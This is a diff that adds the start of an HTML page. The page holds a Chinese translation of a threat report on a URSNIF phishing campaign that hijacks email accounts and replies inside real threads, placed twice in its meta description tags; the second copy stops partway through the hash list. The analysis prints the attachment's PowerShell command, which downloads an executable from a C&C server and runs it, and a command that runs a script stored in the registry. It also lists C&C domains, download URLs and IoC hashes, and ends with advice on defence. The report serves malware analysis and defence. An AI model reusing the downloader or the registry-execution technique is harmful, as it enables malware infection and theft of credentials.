@@ -1,0 +1,11437 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <title>渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 - iYouPort – 觀點2 – 高頻版 git.io/JUJZT</title>
+
+      <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="
+  
+     渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 
+  
+  
+  McCaffrey     Knowledge Node  ,  技术  ,  技术防身/自我保护方法  ,  给行动者的护身符和武器             2018年10月30日 
+          2019年8月10日 
+   4 Minutes 
+  
+  
+    
+       
+      
+       攻击者正在采取更为复杂的网络钓鱼。由于网络钓鱼攻击依赖于社交工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户……
+      
+      
+    
+           
+  
+      
+
+    大多数网络钓鱼活动，其本质非常简单，并且易于发现。攻击者往往会发送一些看似合法的电子邮件，并在其文本中嵌入恶意链接，或在邮件中添加恶意附件。然而，趋势科技在今年9月监测到的恶意邮件活动却表明，攻击者正在采取更为复杂的网络钓鱼形式。
+     
+     该恶意活动会盗取电子邮件账户
+      
+    ，并对邮箱中已有的邮件内容进行回复，在回复的内容中附带恶意软件
+    。对已有邮件的回复，实际上是连续通信中的一部分，因此这种特殊的钓鱼方式难以被用户发现，也难以检测。通常，受害者都没有意识到他们正在遭受钓鱼邮件的威胁。
+    这些攻击与今年早些时候 Talos 发现的  URSNIF/GOZI 恶意邮件  活动非常相似，该恶意活动使用暗云僵尸网络中部分被劫持的计算机向已有邮件发送回信，很可能是 URSNIF/GOZI 恶意邮件活动的升级版本或演变版本。
+    根据迄今为止收集到的数据，趋势科技发现该恶意活动主要影响北美和欧洲地区， 
+    同时在亚洲和拉丁美洲地区也发现了类似的攻击。
+   
+    本次恶意活动的主要目标是教育、金融和能源行业。然而，此次恶意活动还影响到了其他行业，包括房地产、交通运输、制造业和政府。
+    
+    捕获样本
+   
+    趋势科技发现了该恶意活动的一个示例，并对电子邮件的内容进行了截图，如下所示：
+    
+       
+  
+      
+      
+Figure 1. Example of a malicious email that is used to reply to a conversation
+      
+    
+    
+    由于发件人是一位熟悉的人，并且邮件也是往来对话中的一部分，因此作为收件人，很容易会相信这只是对此前邮件内容的另一封回复邮件。此外，该回复的标题和语法似乎都是正确的，甚至在电子邮件的末尾还附带了签名
+    。
+    当然，如果仔细检查，会发现这封电子邮件中存在一些可疑的地方。最明显之处在于，使用的语言从法语变成了英语。此外，恶意电子邮件中的签名与合法电子邮件的签名是不同的。最后还有一点，就是该邮件的内容是通用的，所以可能会偏离原来的交流内容。尽管不能通过这些因素，直接判断出这封邮件是恶意的，但至少能够提起警惕。然而，如果不经仔细阅读，这些小细节可能难以发现，特别是那些每天有大量邮件往来的人。
+    
+       
+  
+      
+      
+Figure 2. Comparison between the malicious email and a legitimate one. Note the difference in language and the changed signature
+      
+    
+    
+    擦亮眼睛！分析电子邮件头部信息
+   
+    在对电子邮件的头部信息进行检查后，发现了该攻击的一些有趣之处。
+    
+       
+  
+      
+      
+Figure 3. The anonymized email header of the malicious message (click the image to zoom in)
+      
+    
+    ⚠️ 在这里， 
+    有3个地方需要注意
+    ：
+    1、通常，恶意邮件都会伪造发件人，会使用 “Return-Path” 或 “Reply-To” 的 SMTP 头部，以便收件人能够将邮件直接回复给恶意攻击者。而在观察到的示例中，没有这两个头部信息，并且所有回复都会发送至发件人（也就是被攻陷的邮箱账户）。这就说明攻击者可能已经通过了发件人邮箱的身份验证。
+    2、“In-Reply-To”头部（或其他类似的 SMTP 头部字段）表示这封邮件是对已有电子邮件通信的回复。
+    3、这封电子邮件的第一跳（The First Hop）来自于 “rrcs-50–74–218–2[.]nyc[.]biz[.]rr[.]com”，这个地址对于家庭用户来说并不常见。对于组织用户来说，除非邮件是来自远程的服务，否则邮件都应该是从组织内部的服务器发送（例如：一个“  sender.co.ca  ”域内的主机）。
+    考虑到这些因素，可以看出这封电子邮件是从美国发出的。而根据示例中发件人邮箱的域名 .ca，这封邮件应该是发自加拿大。
+    经过进一步的调查，发现该域名在2018年9月期间使用了多个电子邮件地址，发送了大量不同的电子邮件。
+    攻击者经常会将附件的文件名与发件人的组织名称相对应，这样就有可能使得邮件看起来更加真实。附件文件名的格式通常是[发件人所在组织]+[与此前通信相关的一个动词，例如“查询”或“请求”].doc，或者就是简单的 [发件人所在组织].doc。这样的附件，使这封邮件不容易被人怀疑。在部分恶意活动中，我们看到附件使用了通用的文件名，例如“查询”、“声明”和“请求”。
+    根据邮件的标题，可以假定，攻击者通过某种方式获得了真实的邮箱账户，并且将该邮箱账户用于类似 BEC 的骗局之中。考虑到其运作方式和使用的技术，怀疑这一新的恶意邮件活动是 URSNIF/GOZI 恶意邮件活动的一部分。发送方的IP地址，可能是僵尸网络中被感染的主机之一。
+    
+    对 Payload 的分析
+   
+    一旦用户双击电子邮件中的恶意.doc附件，就会调用 PowerShell 从 C&amp;C 服务器下载最新版本的 URSNIF（检测为 TSPY_URSNIF.THAOOCAH）恶意软件：
+    
+      
+     powershell $VWc=new-object Net.WebClient;$wIt=’http: //t95dfesc2mo5jr. com/RTT/opanskot.php?l=targa2.tkn’.Split(‘@’);$jzK = ‘369’;$Aiz=$env:public+’\’+$jzK+’.exe’;foreach($fqd in $wIt){try{$VWc.DownloadFile($fqd, $Aiz);Invoke-Item $Aiz;break;}catch{}}
+    
+    
+    该文件是恶意软件的主要加载程序。但是， 
+    在执行其例程之前，它首先会检查操作系统版本，只允许在 Microsoft 操作系统上执行，特别是 Windows Vista 及以上版本。此外，它会避免在某些语言环境中运行，例如 CN（中国）和 RU（俄罗斯）
+    。
+    主加载器负责管理整个执行过程，并将事件记录在文本文件中：
+    
+      %User Temp%\{temp filename}.bin
+    
+    
+       
+  
+      
+      
+Figure 4. Logs of the malware’s loader (click the image to zoom in)
+      
+    
+    它会从 C&amp;C 服务器下载其他模块，并将它们保存在注册表文件夹 HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–15700F2219A4中。
+    下图展示了创建的注册表项，以及包含脚本和二进制文件的条目。
+    
+       
+  
+      
+      
+Figure 5. The registry key and entries containing scripts and binaries
+      
+    
+    请注意，尽管这些键和部分注册表项的名称在不同计算机上不尽相同，但其位置始终位于 HKCU\Software\AppDataLow\Software\Microsoft\。
+    在下载组件后，会执行存储在 comsxRes（此名称可能会发生变化）中的 PowerShell 脚本。下面的命令行指令展示了如何调用注册表中的十六进制值。
+    
+      exe /C powershell invoke-expression([System.Text.Encoding]::ASCII.GetString((get-itemproperty ‘HKCU:\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–7C9D-AB0E-15700F2219A4’).comsxRes
+    
+    
+       
+  
+      
+      
+Figure 6. Hex values of comsxRes
+      
+    
+    当此脚本加载存储在注册表中的嵌入式二进制文件时，无文件执行就开始了。在下图中，用–{hex-encoded binary} — 替换了二进制数据，从而能展现出全部代码。原始脚本的最底部部分也是使用了 Base64 编码，对其进行了解码，以保证可读性。
+    
+       
+  
+      
+      
+Figure 7. Code of the embedded binary that is stored in the registry
+      
+    
+    恶意程序会在创建的注册表项中搜索 Client32/Client64，并将该代码注入到 explorer.exe 以保证可以持续保留在内存中。注册表中的其他条目在后续例程运行过程中是必不可少的，因为这些条目会被注入的恶意软件代码所引用。例如，“TorClient” 条目指定了恶意软件如何通过 Tor 网络与其 C&amp;C 服务器通信。
+    
+    五、分析信息窃取例程
+   
+    最终的 Payload 是一个名为 Client32 或 Client64 的 DLL 文件，具体取决于主机的体系架构。它也如同大多数恶意软件的组件一样，存储在注册表中。 
+    最终 Payload 的主要目标是进行信息窃取，其中包括以下信息：
+   
+    · 系统信息
+    · 已安装的应用程序列表
+    · 已安装的驱动程序列表
+    · 正在运行的进程列表
+    · 网络设备列表
+    · 外网IP地址
+    · 电子邮件凭据（IMAP、POP3、SMTP）
+    · Cookie
+    · 证书
+    · 屏幕视频捕获（AVI 格式）
+    · 通过网页劫持获得的财务相关信息
+    
+    BSS 段加密
+   
+    在趋势科技所分析的所有 URSNIF 二进制文件中，都包含这个加密部分。在这一部分中，包含着将在代码中使用的所有相关字符串，并且仅会在恶意程序运行时解密。因此无法对字符串进行分析，也无法进行反编译，使得整个分析过程更为复杂。
+    
+    恶意软件的反分析机制
+   
+    为了防止研究人员通过沙箱获取到服务器和配置等信息，URSNIF 会在运行时两次检查光标的位置。如果光标位置不发生变化，那么就说明该恶意软件可能正在沙箱中进行分析，或是正在通过调试器进行分析。反分析的检查将在BSS部分被解密之前完成。如果发现存在问题，那么就会导致该恶意程序进入无限循环，并产生乱码字符串。
+    根据在这次攻击中所看到的情况，似乎攻击者正在不断对他们的网络钓鱼攻击方式进行更新，并探索更能有效迷惑用户的方法。这些网络攻击者不再满足于常规的钓鱼邮件，而是将他们的攻击巧妙的整合到正在进行的对话中，这就使得普通用户难以发现。这样的升级，其实正是攻击者和安全人员之间永无止境的猫捉老鼠游戏中的一部分。
+    
+    防范方法
+   
+    由于网络钓鱼攻击依赖于社会工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户。由此提醒大家， 
+    应该尽可能通过双因素身份认证（2FA）来保护自己的网络账户
+    。此外，作为组织，还应该考虑将双因素身份认证集成到系统之中，并且为组织中的成员提供可靠的认证。
+    ⚠️ 此外， 
+    要防范网络钓鱼，还应注意以下几点
+    ：
+    
+      组织中的所有用户都应具备足够的安全意识，了解网络钓鱼攻击的概念、网络钓鱼攻击的常见手段和识别可疑电子邮件的方法。
+      遇到任何可疑的请求时，都应进一步与相关人员进行核实，特别是在进行金融交易之前，务必要谨慎操作。
+      避免打开任何建议修改 Word 中安全配置的文档，这样的文档很有可能是恶意文件。
+      留意邮件中所有可疑之处，包括是否符合对话的上下文、是否使用了你们常用的语言、是否使用的是常用的邮件签名。
+    
+    
+    使用可管理的检测与响应服务（MDR）
+   
+    随着网络钓鱼攻击方式的日益复杂，组织内部的IT团队和安全团队可能难以监控网络和各个终端是否存在被攻击的迹象。尽管提升员工的安全意识有助于防范威胁，但如果要让员工识别精心伪造的电子邮件，还是具有一定的难度。
+    针对没有安全运营中心（SOC）的组织而言，就面临这一个双重挑战，因为一般的 IT 团队往往缺乏进行威胁研究和分析的经验。针对这些组织，建议采用第三方安全厂商的“可管理的检测与响应服务”（  MDR  ），从而帮助抵御高级威胁。Mdr 可以为攻击中的各种环境指标提供一个基线，并且使用这些指标作为安全分析的基础。
+    
+    IoC
+   
+    
+    Word文件的哈希值
+   
+    检测为TROJ_FRS.VSN0BI18 / Trojan.W97M.POWLOAD.SMY：
+    
+      bdd3f03fb074c55cf46d91963313966ce26afdb13b1444258f8f9e7e723d8395
+      dd7b4fc4d5cc1c1e25c800d5622423725a1b29000f93b658a54e267bbbe6f528
+      4df47982fdd1ac336625600fa8c947d45909248309b117d05fc532a2260c7bc4
+    
+    检测为Trojan.W97M.POWLOAD.FGAIBT：
+    
+      f88ef62f2342f4d1105cfe85395b735efd3f0308b79551944983ce245d425510
+      567fe3794a9eec27697ae0634861d284279261880887f60a7374c6cbe63b7674
+    
+    检测为Trojan.W97M.POWLOAD.NSFGAIBF：
+    
+      52d3ece98b6b3b686925156c3d62d8ce133fe3326e11b4c981c251452e4a41d2
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT：
+    
+      4d0762a6b2879d2fa821716db76bc980fdb3b8507611d2853df58c0d4127f9ea
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT2：
+    
+      47e2c66ba16e3ffa9704a13f2c00670319bf292b3d2aa7deede5442da02181e5
+      c2c946f7fd63fc15048a9af4043686f5a56b169e74cb36892fb8d1563b810467
+    
+    检测为Trojan.W97M.POWLOAD.SMTHF3：
+    
+      21ce42a1fc6631ed10db3d0e44b4ccb6d96a729fc494bd86a57cf07ff72cb8f2
+    
+    检测为Trojan.W97M.POWLOAD.SMY：
+    
+      de8f8f39259992886da3b07635cbf121027379e5c1a156a32c6c6e5ace3cc4c3
+      6b387b8534da9cc7cf0af4f2fb8c2a92f9316c0ea6ffb9cfe49b09b4c3df9778
+      6bf99f4b17a07e788219333d96a7a19c9eddc1b49d16c2a21da255a6a16c80d5
+      33d078881456e3b930c480803902fa28142b17c8550f3932e7cf4a1df0eb9213
+      6ca2d4dcea456b9d4c87f211ed20bb32f71a0c78ee8059b934162e643d66e0c9
+      82bee0c249b63f349d212a36f0b9ad90f909017ac734eac133353a1135d7474d
+      1f2e12a58cc23f4e6e7f17b8c1a5c50b88614fda103577354b9564f2dffc257f
+    
+    检测为W2KM_POWLOAD.FGAIBT：
+    
+      1db71aec64d0e391a8c99f4f6ee214962a281733643ace0874cf69e2843f448c
+    
+    检测为W2KM_POWLOAD.NSFGAIBF：
+    
+      c33d642da477f65c11daa9e8098b9917c4c5a6f131dd1369a20cb1b14c4cc261
+      398e677290b1db00d8751c3498847ad9c7d10721630175d2506c4d45af19d229
+      813a08d3b2216c89d42e8225c6de760d785905d1c76bd7428201d68c3c368f65
+    
+    检测为W2KM_POWLOAD.THIACAH：
+    
+      5aed7d6a3e8692143e53f9556cd3aa371149c96b91c02d1c659cb58d88572e47
+    
+    
+    下载的URSNIF
+   
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      0a38d92775cfc7182076d9a21c4937149ea8be6ebf22b9530afbca57d69c0d46
+    
+    
+    可执行文件Payload
+   
+    检测为TrojanSpy.Win32.URSNIF.BAIEF：
+    
+      358bd52ac46755b1c6fa73805a7a355450f85f4bcf1b2e798a04960743390422
+    
+    检测为TSPY_URSNIF.THAOOCAH：
+    
+      e8633f2f2b6b0b8f7348b4660e325ab25b87ec8faa40fb49eb0215b31bd276aa
+    
+    检测为TSPY_URSNIF.BAIEB：
+    
+      f92ba10fe245c00575ae8031d4c721fe0ebb0820a4f45f3bbce02654a6e7f18d
+    
+    
+    下载URL
+   
+    
+      hxxp://t95dfesc2mo5jr[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://enduuyyhgeetyasd[.]com/RTT/opanskot[.]php?l=omg8[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb1[.]tkn
+      hxxp://yrtw1djmj6eth7[.]com/RTT/opanskot[.]php?l=okb7[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr7[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa2[.]tkn
+      hxxp://e3u1oz4an1dqmj[.]com/RTT/opanskot[.]php?l=okb9[.]tkn
+      hxxp://popoasdzxcqe[.]com/YUY/huonasdh[.]php?l=rgr3[.]tkn
+      hxxp://2dhtsif1a8jhyb[.]com/RTT/opanskot[.]php?l=okb5[.]tkn
+      hxxp://hbhbasdqweb[.]com/YUY/huonasdh[.]php?l=rgr4[.]tkn
+      hxxp://q0fpkblizxfe1l[.]com/RTT/opanskot[.]php?l=targa4[.]tkn
+    
+    
+    C&amp;C 服务器
+   
+    
+      app[.]kartop[.]at
+      doc[.]dicin[.]at
+      doc[.]avitoon[.]at
+      app[.]avitoon[.]at
+      ops[.]twidix[.]at
+      xx[.]go10og[.]at
+      api[.]kartop[.]at
+      m1[.]fofon[.]at
+      cdn[.]kartop[.]at
+      api[.]tylron[.]at
+      chat[.]twidix[.]at
+      api[.]kaonok[.]at
+      chat[.]jimden[.]at
+      mahono[.]cn
+    
+    趋势科技 XGen™安全性提供跨代混合的威胁防御技术，以保护系统免受各种类型的威胁，包括勒索软件和加密货币挖掘恶意软件。在网关和端点上具有高保真的机器学习功能，可以保护物理、虚拟和云工作负载。借助 Web / URL 过滤，行为分析和自定义沙盒等功能，XGen 安全可以抵御当今绕过传统控制的威胁，利用已知、未知或未公开的漏洞，窃取或加密个人身份数据、或进行恶意加密货币挖掘的威胁。◾️
+    
+    
+      
+         共享此文章： 
+        
+          
+                点击以在 Twitter 上共享（在新窗口中打开）  
+                点击以在 Facebook 上共享（在新窗口中打开）  
+            
+          
+        
+      
+    
+    
+       赞过： 
+      
+  赞    正在加载…… 
+      
+   
+   
+    
+    
+       
+     相关
+     
+    
+  
+  
+    
+      Tagged
+       phishing 
+       Security 
+       selfcare 
+       Technology 
+       URSNIF 
+    
+  
+  
+    
+
+    Published
+           2018年10月30日 
+       2019年8月10日 
+    
+  
+
+" />
+    <meta property="og:description" content="
+  
+     渔艺正在升级：URSNIF 恶意软件新变种通过回复邮件即可实现传播 
+  
+  
+  McCaffrey     Knowledge Node  ,  技术  ,  技术防身/自我保护方法  ,  给行动者的护身符和武器             2018年10月30日 
+          2019年8月10日 
+   4 Minutes 
+  
+  
+    
+       
+      
+       攻击者正在采取更为复杂的网络钓鱼。由于网络钓鱼攻击依赖于社交工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户……
+      
+      
+    
+           
+  
+      
+
+    大多数网络钓鱼活动，其本质非常简单，并且易于发现。攻击者往往会发送一些看似合法的电子邮件，并在其文本中嵌入恶意链接，或在邮件中添加恶意附件。然而，趋势科技在今年9月监测到的恶意邮件活动却表明，攻击者正在采取更为复杂的网络钓鱼形式。
+     
+     该恶意活动会盗取电子邮件账户
+      
+    ，并对邮箱中已有的邮件内容进行回复，在回复的内容中附带恶意软件
+    。对已有邮件的回复，实际上是连续通信中的一部分，因此这种特殊的钓鱼方式难以被用户发现，也难以检测。通常，受害者都没有意识到他们正在遭受钓鱼邮件的威胁。
+    这些攻击与今年早些时候 Talos 发现的  URSNIF/GOZI 恶意邮件  活动非常相似，该恶意活动使用暗云僵尸网络中部分被劫持的计算机向已有邮件发送回信，很可能是 URSNIF/GOZI 恶意邮件活动的升级版本或演变版本。
+    根据迄今为止收集到的数据，趋势科技发现该恶意活动主要影响北美和欧洲地区， 
+    同时在亚洲和拉丁美洲地区也发现了类似的攻击。
+   
+    本次恶意活动的主要目标是教育、金融和能源行业。然而，此次恶意活动还影响到了其他行业，包括房地产、交通运输、制造业和政府。
+    
+    捕获样本
+   
+    趋势科技发现了该恶意活动的一个示例，并对电子邮件的内容进行了截图，如下所示：
+    
+       
+  
+      
+      
+Figure 1. Example of a malicious email that is used to reply to a conversation
+      
+    
+    
+    由于发件人是一位熟悉的人，并且邮件也是往来对话中的一部分，因此作为收件人，很容易会相信这只是对此前邮件内容的另一封回复邮件。此外，该回复的标题和语法似乎都是正确的，甚至在电子邮件的末尾还附带了签名
+    。
+    当然，如果仔细检查，会发现这封电子邮件中存在一些可疑的地方。最明显之处在于，使用的语言从法语变成了英语。此外，恶意电子邮件中的签名与合法电子邮件的签名是不同的。最后还有一点，就是该邮件的内容是通用的，所以可能会偏离原来的交流内容。尽管不能通过这些因素，直接判断出这封邮件是恶意的，但至少能够提起警惕。然而，如果不经仔细阅读，这些小细节可能难以发现，特别是那些每天有大量邮件往来的人。
+    
+       
+  
+      
+      
+Figure 2. Comparison between the malicious email and a legitimate one. Note the difference in language and the changed signature
+      
+    
+    
+    擦亮眼睛！分析电子邮件头部信息
+   
+    在对电子邮件的头部信息进行检查后，发现了该攻击的一些有趣之处。
+    
+       
+  
+      
+      
+Figure 3. The anonymized email header of the malicious message (click the image to zoom in)
+      
+    
+    ⚠️ 在这里， 
+    有3个地方需要注意
+    ：
+    1、通常，恶意邮件都会伪造发件人，会使用 “Return-Path” 或 “Reply-To” 的 SMTP 头部，以便收件人能够将邮件直接回复给恶意攻击者。而在观察到的示例中，没有这两个头部信息，并且所有回复都会发送至发件人（也就是被攻陷的邮箱账户）。这就说明攻击者可能已经通过了发件人邮箱的身份验证。
+    2、“In-Reply-To”头部（或其他类似的 SMTP 头部字段）表示这封邮件是对已有电子邮件通信的回复。
+    3、这封电子邮件的第一跳（The First Hop）来自于 “rrcs-50–74–218–2[.]nyc[.]biz[.]rr[.]com”，这个地址对于家庭用户来说并不常见。对于组织用户来说，除非邮件是来自远程的服务，否则邮件都应该是从组织内部的服务器发送（例如：一个“  sender.co.ca  ”域内的主机）。
+    考虑到这些因素，可以看出这封电子邮件是从美国发出的。而根据示例中发件人邮箱的域名 .ca，这封邮件应该是发自加拿大。
+    经过进一步的调查，发现该域名在2018年9月期间使用了多个电子邮件地址，发送了大量不同的电子邮件。
+    攻击者经常会将附件的文件名与发件人的组织名称相对应，这样就有可能使得邮件看起来更加真实。附件文件名的格式通常是[发件人所在组织]+[与此前通信相关的一个动词，例如“查询”或“请求”].doc，或者就是简单的 [发件人所在组织].doc。这样的附件，使这封邮件不容易被人怀疑。在部分恶意活动中，我们看到附件使用了通用的文件名，例如“查询”、“声明”和“请求”。
+    根据邮件的标题，可以假定，攻击者通过某种方式获得了真实的邮箱账户，并且将该邮箱账户用于类似 BEC 的骗局之中。考虑到其运作方式和使用的技术，怀疑这一新的恶意邮件活动是 URSNIF/GOZI 恶意邮件活动的一部分。发送方的IP地址，可能是僵尸网络中被感染的主机之一。
+    
+    对 Payload 的分析
+   
+    一旦用户双击电子邮件中的恶意.doc附件，就会调用 PowerShell 从 C&amp;C 服务器下载最新版本的 URSNIF（检测为 TSPY_URSNIF.THAOOCAH）恶意软件：
+    
+      
+     powershell $VWc=new-object Net.WebClient;$wIt=’http: //t95dfesc2mo5jr. com/RTT/opanskot.php?l=targa2.tkn’.Split(‘@’);$jzK = ‘369’;$Aiz=$env:public+’\’+$jzK+’.exe’;foreach($fqd in $wIt){try{$VWc.DownloadFile($fqd, $Aiz);Invoke-Item $Aiz;break;}catch{}}
+    
+    
+    该文件是恶意软件的主要加载程序。但是， 
+    在执行其例程之前，它首先会检查操作系统版本，只允许在 Microsoft 操作系统上执行，特别是 Windows Vista 及以上版本。此外，它会避免在某些语言环境中运行，例如 CN（中国）和 RU（俄罗斯）
+    。
+    主加载器负责管理整个执行过程，并将事件记录在文本文件中：
+    
+      %User Temp%\{temp filename}.bin
+    
+    
+       
+  
+      
+      
+Figure 4. Logs of the malware’s loader (click the image to zoom in)
+      
+    
+    它会从 C&amp;C 服务器下载其他模块，并将它们保存在注册表文件夹 HKEY_CURRENT_USER\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–15700F2219A4中。
+    下图展示了创建的注册表项，以及包含脚本和二进制文件的条目。
+    
+       
+  
+      
+      
+Figure 5. The registry key and entries containing scripts and binaries
+      
+    
+    请注意，尽管这些键和部分注册表项的名称在不同计算机上不尽相同，但其位置始终位于 HKCU\Software\AppDataLow\Software\Microsoft\。
+    在下载组件后，会执行存储在 comsxRes（此名称可能会发生变化）中的 PowerShell 脚本。下面的命令行指令展示了如何调用注册表中的十六进制值。
+    
+      exe /C powershell invoke-expression([System.Text.Encoding]::ASCII.GetString((get-itemproperty ‘HKCU:\Software\AppDataLow\Software\Microsoft\3A861D62–51E0–7C9D-AB0E-15700F2219A4’).comsxRes
+    
+    
+       
+  
+      
+      
+Figure 6. Hex values of comsxRes
+      
+    
+    当此脚本加载存储在注册表中的嵌入式二进制文件时，无文件执行就开始了。在下图中，用–{hex-encoded binary} — 替换了二进制数据，从而能展现出全部代码。原始脚本的最底部部分也是使用了 Base64 编码，对其进行了解码，以保证可读性。
+    
+       
+  
+      
+      
+Figure 7. Code of the embedded binary that is stored in the registry
+      
+    
+    恶意程序会在创建的注册表项中搜索 Client32/Client64，并将该代码注入到 explorer.exe 以保证可以持续保留在内存中。注册表中的其他条目在后续例程运行过程中是必不可少的，因为这些条目会被注入的恶意软件代码所引用。例如，“TorClient” 条目指定了恶意软件如何通过 Tor 网络与其 C&amp;C 服务器通信。
+    
+    五、分析信息窃取例程
+   
+    最终的 Payload 是一个名为 Client32 或 Client64 的 DLL 文件，具体取决于主机的体系架构。它也如同大多数恶意软件的组件一样，存储在注册表中。 
+    最终 Payload 的主要目标是进行信息窃取，其中包括以下信息：
+   
+    · 系统信息
+    · 已安装的应用程序列表
+    · 已安装的驱动程序列表
+    · 正在运行的进程列表
+    · 网络设备列表
+    · 外网IP地址
+    · 电子邮件凭据（IMAP、POP3、SMTP）
+    · Cookie
+    · 证书
+    · 屏幕视频捕获（AVI 格式）
+    · 通过网页劫持获得的财务相关信息
+    
+    BSS 段加密
+   
+    在趋势科技所分析的所有 URSNIF 二进制文件中，都包含这个加密部分。在这一部分中，包含着将在代码中使用的所有相关字符串，并且仅会在恶意程序运行时解密。因此无法对字符串进行分析，也无法进行反编译，使得整个分析过程更为复杂。
+    
+    恶意软件的反分析机制
+   
+    为了防止研究人员通过沙箱获取到服务器和配置等信息，URSNIF 会在运行时两次检查光标的位置。如果光标位置不发生变化，那么就说明该恶意软件可能正在沙箱中进行分析，或是正在通过调试器进行分析。反分析的检查将在BSS部分被解密之前完成。如果发现存在问题，那么就会导致该恶意程序进入无限循环，并产生乱码字符串。
+    根据在这次攻击中所看到的情况，似乎攻击者正在不断对他们的网络钓鱼攻击方式进行更新，并探索更能有效迷惑用户的方法。这些网络攻击者不再满足于常规的钓鱼邮件，而是将他们的攻击巧妙的整合到正在进行的对话中，这就使得普通用户难以发现。这样的升级，其实正是攻击者和安全人员之间永无止境的猫捉老鼠游戏中的一部分。
+    
+    防范方法
+   
+    由于网络钓鱼攻击依赖于社会工程技术，因此它们往往非常有效。这些技术会创建一些可信的场景或对话，从而诱使用户泄漏信息，或下载恶意软件。在本文的案例中，最棘手的问题在于发件人是真实的用户。由此提醒大家， 
+    应该尽可能通过双因素身份认证（2FA）来保护自己的网络账户
+    。此外，作为组织，还应该考虑将双因素身份认证集成到系统之中，并且为组织中的成员提供可靠的认证。
+    ⚠️ 此外， 
+    要防范网络钓鱼，还应注意以下几点
+    ：
+    
+      组织中的所有用户都应具备足够的安全意识，了解网络钓鱼攻击的概念、网络钓鱼攻击的常见手段和识别可疑电子邮件的方法。
+      遇到任何可疑的请求时，都应进一步与相关人员进行核实，特别是在进行金融交易之前，务必要谨慎操作。
+      避免打开任何建议修改 Word 中安全配置的文档，这样的文档很有可能是恶意文件。
+      留意邮件中所有可疑之处，包括是否符合对话的上下文、是否使用了你们常用的语言、是否使用的是常用的邮件签名。
+    
+    
+    使用可管理的检测与响应服务（MDR）
+   
+    随着网络钓鱼攻击方式的日益复杂，组织内部的IT团队和安全团队可能难以监控网络和各个终端是否存在被攻击的迹象。尽管提升员工的安全意识有助于防范威胁，但如果要让员工识别精心伪造的电子邮件，还是具有一定的难度。
+    针对没有安全运营中心（SOC）的组织而言，就面临这一个双重挑战，因为一般的 IT 团队往往缺乏进行威胁研究和分析的经验。针对这些组织，建议采用第三方安全厂商的“可管理的检测与响应服务”（  MDR  ），从而帮助抵御高级威胁。Mdr 可以为攻击中的各种环境指标提供一个基线，并且使用这些指标作为安全分析的基础。
+    
+    IoC
+   
+    
+    Word文件的哈希值
+   
+    检测为TROJ_FRS.VSN0BI18 / Trojan.W97M.POWLOAD.SMY：
+    
+      bdd3f03fb074c55cf46d91963313966ce26afdb13b1444258f8f9e7e723d8395
+      dd7b4fc4d5cc1c1e25c800d5622423725a1b29000f93b658a54e267bbbe6f528
+      4df47982fdd1ac336625600fa8c947d45909248309b117d05fc532a2260c7bc4
+    
+    检测为Trojan.W97M.POWLOAD.FGAIBT：
+    
+      f88ef62f2342f4d1105cfe85395b735efd3f0308b79551944983ce245d425510
+      567fe3794a9eec27697ae0634861d284279261880887f60a7374c6cbe63b7674
+    
+    检测为Trojan.W97M.POWLOAD.NSFGAIBF：
+    
+      52d3ece98b6b3b686925156c3d62d8ce133fe3326e11b4c981c251452e4a41d2
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT：
+    
+      4d0762a6b2879d2fa821716db76bc980fdb3b8507611d2853df58c0d4127f9ea
+    
+    检测为Trojan.W97M.POWLOAD.SMEMOT2：
+    
+      47e2c66ba16e3ffa9704a13f2c00670319bf292b3d2aa7deede5442da02181e5
+      c2c946f7fd63fc15048a9af4043686f5a56b169e74cb36892fb8d1563b810467
+    
+    检测为Trojan.W97M.POWLOAD.SMTHF3：
+    
+      21ce42a1fc6631ed10db3d0e44b4ccb6d96a729fc494bd86a57cf07ff72cb8f2
+    
+    检测为Trojan.W97M.POWLOAD.SMY：
+    
+      de8f8f39259992886da3b07635cbf121027379e5c1a156a32c6c6e5ace3cc4c3
+      6b387b8534da9cc7cf0af4f2fb8c2a92f9316c0ea6ffb9cfe49b09b4c3df9778
+      6bf99f4b17a07e788219333d96a7a19c9eddc1b49d16c2a21da255a6a16c80d5
+      33d078881456e3b930c480803902fa28142b17c8550f3932e7cf4a1df0eb9213
+      6ca2d4dcea456b9d4c87f211ed20bb32f71a0c78ee8059b934162e643d66e0c9
+      82bee0c249b63f349d212a36f0b9ad90f909017ac734eac133353a1135d7474d
+      1f2e12a58cc23f4e6e7f17b8c1a5c50b88614fda103577354b9564f2dffc257f
+    
+    检测为W2KM_POWLOAD.FGAIBT：
+    
+      1db71aec64d0e391a8c99f4f6ee214962a281733643ace0874cf69e2843f448c
+    
+    检测为W2KM_POWLOAD.NSFGAIBF：
+    
+      c33d642da477f65c11daa9e8098b9917c4c5a6f131dd1369a20cb1b14c4cc261
+      398e677290b1db00d8751c3498847ad9c7d10721630175d2506c4d45af19d229
+      813a08d3b2216c89d42e8225c6de760d785905d1c76bd7428201d68c3c368f65
+    
+    检测为W2KM_POWLOAD.THIACAH：
+    
